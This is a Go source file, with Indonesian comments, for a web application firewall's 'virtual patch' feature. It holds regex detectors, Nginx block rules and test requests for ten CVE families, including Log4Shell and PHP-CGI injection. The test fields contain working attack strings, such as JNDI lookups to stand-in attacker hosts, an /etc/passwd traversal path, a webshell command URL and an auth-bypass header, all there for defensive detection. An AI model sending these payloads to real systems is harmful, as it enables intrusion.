package waf

import (
	"context"
	"regexp"
	"strings"
	"time"
)

// VirtualPatch merepresentasikan paket aturan proteksi 1-klik Nginx + detektor log untuk CVE web spesifik
type VirtualPatch struct {
	ID           string   `json:"id"`
	CVEIDs       []string `json:"cve_ids"`
	Title        string   `json:"title"`
	Product      string   `json:"product"`
	Severity     string   `json:"severity"`
	CVSS         float64  `json:"cvss"`
	Description  string   `json:"description"`
	NginxSnippet string   `json:"nginx_snippet"`
	TestMethod   string   `json:"test_method"`
	TestPath     string   `json:"test_path"`
	TestHeader   string   `json:"test_header,omitempty"`
	TestUA       string   `json:"test_ua,omitempty"`
	Enabled      bool     `json:"enabled"`
}

// compiledVirtualPatch menyimpan definisi virtual patch beserta fungsi pencocokan payload cepat
type compiledVirtualPatch struct {
	meta  VirtualPatch
	match func(method, path, ua string, headers map[string]string) bool
}

var (
	reVPPHPCGI      = regexp.MustCompile(`(?i)(%ad|%25ad|\?-s|\?-d|allow_url_include|auto_prepend_file|php://input|php://filter)`)
	reVPReact2Shell = regexp.MustCompile(`(?i)(__proto__|constructor\s*:\s*constructor|child_process|mainModule|process\.mainModule|"\$@\d+"|resolved_model)`)
	reVPLaravelRCE  = regexp.MustCompile(`(?i)(/_ignition/execute-solution|/vendor/phpunit/.*/eval-stdin\.php|/_ignition/share-report|php://filter/write=convert\.)`)
	reVPWordPress   = regexp.MustCompile(`(?i)(/xmlrpc\.php|/wp-includes/wlwmanifest\.xml|/wp-content/uploads/.*\.php|/wp-json/wp/v2/users)`)
	reVPLog4Shell   = regexp.MustCompile(`(?i)(\$\{jndi:|%24%7bjndi:|\$\{\$\{lower:j\})`)
	reVPNginxTrav   = regexp.MustCompile(`(?i)(%2e%2e|%252e%252e|\.\.%2f|%2f\.\.|%0d%0a|\\r\\n)`)
	reVPSpringRCE   = regexp.MustCompile(`(?i)(class\.module\.classloader|/actuator/(env|heapdump|gateway|jolokia|mappings))`)
	reVPGoPprof     = regexp.MustCompile(`(?i)(^/debug/pprof|^/debug/vars)`)
	reVPWebshell    = regexp.MustCompile(`(?i)(/(c99|r57|wso|alfa|b374k|indoxploit|shell|cmd|backdoor|webshell)\.php|(passthru|shell_exec|proc_open|popen|assert)\s*\()`)
)

// builtinVirtualPatches memuat 10 paket Virtual Patch nyata untuk CVE kritis web/server paling sering dieksploitasi
var builtinVirtualPatches = []compiledVirtualPatch{
	{
		meta: VirtualPatch{
			ID:          "vp-php-cgi-2024-4577",
			CVEIDs:      []string{"CVE-2024-4577", "CVE-2012-1823"},
			Title:       "PHP-CGI Argument Injection (PHP2Shell)",
			Product:     "php",
			Severity:    "critical",
			CVSS:        9.8,
			Description: "Memblokir injeksi argumen PHP-CGI (%AD, ?-d allow_url_include, auto_prepend_file, php://input) yang memicu Remote Code Execution.",
			NginxSnippet: `# Virtual Patch: CVE-2024-4577 PHP-CGI Argument Injection (PHP2Shell)
if ($request_uri ~* "(%ad|%25ad|\?-s|\?-d|allow_url_include|auto_prepend_file|php://input|php://filter)") { set $fik_waf_block 1; }`,
			TestMethod: "POST",
			TestPath:   "/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
		},
		match: func(_, path, _ string, _ map[string]string) bool {
			return reVPPHPCGI.MatchString(path)
		},
	},
	{
		meta: VirtualPatch{
			ID:          "vp-react2shell-2025-55182",
			CVEIDs:      []string{"CVE-2025-55182", "CVE-2025-66478"},
			Title:       "React Server Components / Flight RCE (React2Shell)",
			Product:     "react",
			Severity:    "critical",
			CVSS:        10.0,
			Description: "Memblokir payload eksploitasi deserialisasi Flight RSC / Next-Action berbahaya (__proto__, child_process, resolved_model).",
			NginxSnippet: `# Virtual Patch: CVE-2025-55182 React2Shell / RSC Flight RCE
if ($request_uri ~* "(__proto__|child_process|mainModule|resolved_model)") { set $fik_waf_block 1; }
if ($http_next_action ~* "(__proto__|constructor|child_process)") { set $fik_waf_block 1; }`,
			TestMethod: "POST",
			TestPath:   "/?payload=__proto__:child_process",
			TestHeader: "Next-Action: __proto__constructor",
		},
		match: func(_, path, _ string, headers map[string]string) bool {
			if reVPReact2Shell.MatchString(path) {
				return true
			}
			for k, v := range headers {
				lk := strings.ToLower(k)
				if (lk == "next-action" || lk == "rsc" || lk == "x-action") && reVPReact2Shell.MatchString(v) {
					return true
				}
			}
			return false
		},
	},
	{
		meta: VirtualPatch{
			ID:          "vp-nextjs-2025-29927",
			CVEIDs:      []string{"CVE-2025-29927"},
			Title:       "Next.js Middleware Authorization Bypass",
			Product:     "nextjs",
			Severity:    "critical",
			CVSS:        9.1,
			Description: "Menolak header internal x-middleware-subrequest dari klien eksternal yang digunakan untuk melewati autentikasi middleware Next.js.",
			NginxSnippet: `# Virtual Patch: CVE-2025-29927 Next.js Middleware Auth Bypass
if ($http_x_middleware_subrequest != "") { set $fik_waf_block 1; }`,
			TestMethod: "GET",
			TestPath:   "/admin",
			TestHeader: "x-middleware-subrequest: middleware:middleware:middleware",
		},
		match: func(_, _, _ string, headers map[string]string) bool {
			for k, v := range headers {
				if strings.EqualFold(k, "x-middleware-subrequest") && strings.TrimSpace(v) != "" {
					return true
				}
			}
			return false
		},
	},
	{
		meta: VirtualPatch{
			ID:          "vp-laravel-ignition",
			CVEIDs:      []string{"CVE-2021-3129", "CVE-2017-9841"},
			Title:       "Laravel Ignition Debug & PHPUnit Eval-Stdin RCE",
			Product:     "laravel",
			Severity:    "critical",
			CVSS:        9.8,
			Description: "Memblokir eksploitasi endpoint /_ignition/execute-solution dan /vendor/phpunit/eval-stdin.php pada aplikasi Laravel/PHP.",
			NginxSnippet: `# Virtual Patch: CVE-2021-3129 Laravel Ignition & CVE-2017-9841 PHPUnit RCE
if ($request_uri ~* "(/_ignition/execute-solution|/vendor/phpunit/.*/eval-stdin\.php|/_ignition/share-report)") { set $fik_waf_block 1; }`,
			TestMethod: "POST",
			TestPath:   "/_ignition/execute-solution",
		},
		match: func(_, path, _ string, _ map[string]string) bool {
			return reVPLaravelRCE.MatchString(path)
		},
	},
	{
		meta: VirtualPatch{
			ID:          "vp-webshell-upload",
			CVEIDs:      []string{"CWE-434", "PHP2Shell"},
			Title:       "PHP Webshell Backdoor & Command Execution Guard",
			Product:     "php",
			Severity:    "critical",
			CVSS:        9.8,
			Description: "Mencegah eksekusi nama berkas webshell umum (c99, wso, alfa, b374k, indoxploit) serta injeksi fungsi passthru/shell_exec/proc_open.",
			NginxSnippet: `# Virtual Patch: PHP Webshell Backdoor & Eval Guard (PHP2Shell)
if ($request_uri ~* "(/(c99|r57|wso|alfa|b374k|indoxploit|webshell|backdoor)\.php|(passthru|shell_exec|proc_open|popen)\()") { set $fik_waf_block 1; }`,
			TestMethod: "GET",
			TestPath:   "/uploads/alfa.php?cmd=id",
		},
		match: func(_, path, _ string, _ map[string]string) bool {
			return reVPWebshell.MatchString(path)
		},
	},
	{
		meta: VirtualPatch{
			ID:          "vp-nginx-traversal",
			CVEIDs:      []string{"CVE-2024-7347", "CWE-22"},
			Title:       "Nginx Alias Traversal & CRLF Request Smuggling",
			Product:     "nginx",
			Severity:    "high",
			CVSS:        8.2,
			Description: "Memblokir encoded directory traversal (%2e%2e, %252e) dan injeksi baris baru CRLF (%0d%0a) pada URI Nginx.",
			NginxSnippet: `# Virtual Patch: Nginx Encoded Traversal & CRLF Smuggling
if ($request_uri ~* "(%2e%2e|%252e%252e|\.\.%2f|%2f\.\.|%0d%0a)") { set $fik_waf_block 1; }`,
			TestMethod: "GET",
			TestPath:   "/static/%2e%2e/%2e%2e/etc/passwd",
		},
		match: func(_, path, _ string, _ map[string]string) bool {
			return reVPNginxTrav.MatchString(path)
		},
	},
	{
		meta: VirtualPatch{
			ID:          "vp-go-pprof-debug",
			CVEIDs:      []string{"CVE-2024-24790", "CWE-215"},
			Title:       "Go Runtime /debug/pprof & Expvar Exposure Guard",
			Product:     "go",
			Severity:    "high",
			CVSS:        7.5,
			Description: "Menutup akses publik tidak sengaja ke endpoint profiling memori/goroutine Go (/debug/pprof dan /debug/vars).",
			NginxSnippet: `# Virtual Patch: Go Debug Pprof & Vars Exposure Guard
if ($request_uri ~* "^/debug/(pprof|vars)") { set $fik_waf_block 1; }`,
			TestMethod: "GET",
			TestPath:   "/debug/pprof/heap",
		},
		match: func(_, path, _ string, _ map[string]string) bool {
			return reVPGoPprof.MatchString(path)
		},
	},
	{
		meta: VirtualPatch{
			ID:          "vp-wordpress-exploits",
			CVEIDs:      []string{"CVE-2024-27956", "WP-XMLRPC"},
			Title:       "WordPress XML-RPC Flood & Upload PHP Guard",
			Product:     "wordpress",
			Severity:    "high",
			CVSS:        8.6,
			Description: "Memblokir penyalahgunaan xmlrpc.php, enumerasi akun /wp-json/wp/v2/users, dan eksekusi berkas PHP di direktori wp-content/uploads.",
			NginxSnippet: `# Virtual Patch: WordPress XML-RPC & Upload PHP Guard
if ($request_uri ~* "(/xmlrpc\.php|/wp-includes/wlwmanifest\.xml|/wp-content/uploads/.*\.php)") { set $fik_waf_block 1; }`,
			TestMethod: "POST",
			TestPath:   "/xmlrpc.php",
		},
		match: func(_, path, _ string, _ map[string]string) bool {
			return reVPWordPress.MatchString(path)
		},
	},
	{
		meta: VirtualPatch{
			ID:          "vp-log4shell-2021-44228",
			CVEIDs:      []string{"CVE-2021-44228", "CVE-2021-45046"},
			Title:       "Log4Shell JNDI Injection Guard",
			Product:     "java",
			Severity:    "critical",
			CVSS:        10.0,
			Description: "Mencegat payload ${jndi:ldap://...} pada URL maupun header User-Agent sebelum mencapai aplikasi backend.",
			NginxSnippet: `# Virtual Patch: CVE-2021-44228 Log4Shell JNDI Guard
if ($request_uri ~* "(\$\{jndi:|%24%7bjndi:)") { set $fik_waf_block 1; }
if ($http_user_agent ~* "(\$\{jndi:|%24%7bjndi:)") { set $fik_waf_block 1; }`,
			TestMethod: "GET",
			TestPath:   "/?q=${jndi:ldap://attacker.invalid/a}",
			TestUA:     "${jndi:ldap://evil.invalid/x}",
		},
		match: func(_, path, ua string, _ map[string]string) bool {
			return reVPLog4Shell.MatchString(path) || reVPLog4Shell.MatchString(ua)
		},
	},
	{
		meta: VirtualPatch{
			ID:          "vp-spring-rce",
			CVEIDs:      []string{"CVE-2022-22965", "CVE-2022-22947"},
			Title:       "Spring4Shell & Actuator Heapdump Guard",
			Product:     "java",
			Severity:    "critical",
			CVSS:        9.8,
			Description: "Memblokir manipulasi class.module.classLoader serta kebocoran endpoint Spring Boot /actuator/env dan /actuator/heapdump.",
			NginxSnippet: `# Virtual Patch: CVE-2022-22965 Spring4Shell & Actuator Guard
if ($request_uri ~* "(class\.module\.classloader|/actuator/(env|heapdump|gateway|jolokia))") { set $fik_waf_block 1; }`,
			TestMethod: "GET",
			TestPath:   "/actuator/heapdump",
		},
		match: func(_, path, _ string, _ map[string]string) bool {
			return reVPSpringRCE.MatchString(path)
		},
	},
}

// ListVirtualPatches mengembalikan seluruh paket Virtual Patch beserta status aktif/nonaktif dari SQLite
func (m *Manager) ListVirtualPatches(ctx context.Context) []VirtualPatch {
	enabledMap := m.loadVirtualPatchMap(ctx)
	out := make([]VirtualPatch, 0, len(builtinVirtualPatches))
	for _, vp := range builtinVirtualPatches {
		item := vp.meta
		item.Enabled = enabledMap[item.ID]
		out = append(out, item)
	}
	return out
}

// loadVirtualPatchMap membaca peta status aktif virtual patch dari tabel waf_virtual_patches
func (m *Manager) loadVirtualPatchMap(ctx context.Context) map[string]bool {
	res := make(map[string]bool)
	rows, err := m.store.DB().QueryContext(ctx, "SELECT patch_id, enabled FROM waf_virtual_patches")
	if err != nil {
		return res
	}
	defer rows.Close()
	for rows.Next() {
		var id string
		var en int
		if err := rows.Scan(&id, &en); err == nil {
			res[id] = en == 1
		}
	}
	return res
}

// SetVirtualPatchEnabled mengaktifkan atau menonaktifkan satu paket Virtual Patch lalu menyinkronkan Nginx secara atomik
func (m *Manager) SetVirtualPatchEnabled(ctx context.Context, patchID string, enabled bool) (*WAFEnforcementStatus, error) {
	found := false
	for _, vp := range builtinVirtualPatches {
		if vp.meta.ID == patchID {
			found = true
			break
		}
	}
	if !found {
		return nil, errInvalidVirtualPatch(patchID)
	}
	enInt := 0
	if enabled {
		enInt = 1
	}
	_, err := m.store.DB().ExecContext(ctx, `
		INSERT INTO waf_virtual_patches (patch_id, enabled, updated_at) VALUES (?, ?, ?)
		ON CONFLICT(patch_id) DO UPDATE SET enabled = excluded.enabled, updated_at = excluded.updated_at
	`, patchID, enInt, time.Now().Unix())
	if err != nil {
		return nil, err
	}
	m.reloadPolicyCache(ctx)
	return m.SyncNginxWAFConfig(ctx)
}

func errInvalidVirtualPatch(id string) error {
	return &wafErr{msg: "paket virtual patch tidak dikenali: " + id}
}

type wafErr struct{ msg string }

func (e *wafErr) Error() string { return e.msg }

// matchActiveVirtualPatches memeriksa payload terhadap seluruh paket virtual patch yang sedang diaktifkan
func matchActiveVirtualPatches(activePatchIDs map[string]bool, method, path, ua string, headers map[string]string) (matched bool, patch *VirtualPatch) {
	if len(activePatchIDs) == 0 {
		return false, nil
	}
	for i := range builtinVirtualPatches {
		vp := &builtinVirtualPatches[i]
		if !activePatchIDs[vp.meta.ID] {
			continue
		}
		if vp.match(method, path, ua, headers) {
			cp := vp.meta
			cp.Enabled = true
			return true, &cp
		}
	}
	return false, nil
}

// findVirtualPatchForCVE mencocokkan CVE ID atau produk dengan paket Virtual Patch bawaan bila tersedia
func findVirtualPatchForCVE(cveID, product, title string) string {
	upperCVE := strings.ToUpper(strings.TrimSpace(cveID))
	for _, vp := range builtinVirtualPatches {
		for _, id := range vp.meta.CVEIDs {
			if strings.EqualFold(id, upperCVE) {
				return vp.meta.ID
			}
		}
	}
	lowTitle := strings.ToLower(title)
	switch strings.ToLower(product) {
	case "php":
		if strings.Contains(lowTitle, "cgi") || strings.Contains(lowTitle, "argument injection") {
			return "vp-php-cgi-2024-4577"
		}
		if strings.Contains(lowTitle, "webshell") || strings.Contains(lowTitle, "rce") {
			return "vp-webshell-upload"
		}
	case "nextjs":
		if strings.Contains(lowTitle, "middleware") {
			return "vp-nextjs-2025-29927"
		}
	case "react":
		if strings.Contains(lowTitle, "server component") || strings.Contains(lowTitle, "flight") || strings.Contains(lowTitle, "rce") {
			return "vp-react2shell-2025-55182"
		}
	case "laravel":
		return "vp-laravel-ignition"
	case "nginx":
		if strings.Contains(lowTitle, "traversal") || strings.Contains(lowTitle, "smuggling") {
			return "vp-nginx-traversal"
		}
	case "wordpress":
		return "vp-wordpress-exploits"
	}
	return ""
}
